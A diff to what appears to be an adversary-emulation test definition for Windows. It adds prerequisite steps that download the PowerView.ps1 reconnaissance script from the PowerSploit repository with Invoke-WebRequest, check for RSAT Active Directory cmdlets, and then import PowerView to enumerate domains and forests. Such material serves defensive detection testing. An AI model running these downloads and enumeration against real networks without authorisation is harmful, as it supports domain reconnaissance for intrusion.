@@ -13,6 +13,19 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        PowerView PowerShell script must exist on disk
+      inline: |
+        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
+        }}
+      executor: powershell
+    - name: |
+        RSAT PowerShell AD admin cmdlets must be installed
+      inline: |
+        if ((Get-Command "Get-ADDomain" -ErrorAction Ignore) -And (Get-Command "Get-ADGroupMember" -ErrorAction Ignore)) { exit 0 } else { {Write-Host "Sorry RSAT must be installed manually"
+        } }
+      executor: powershell
     - name: powershell-enumerate-domains-and-forests
       inline: |
         Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
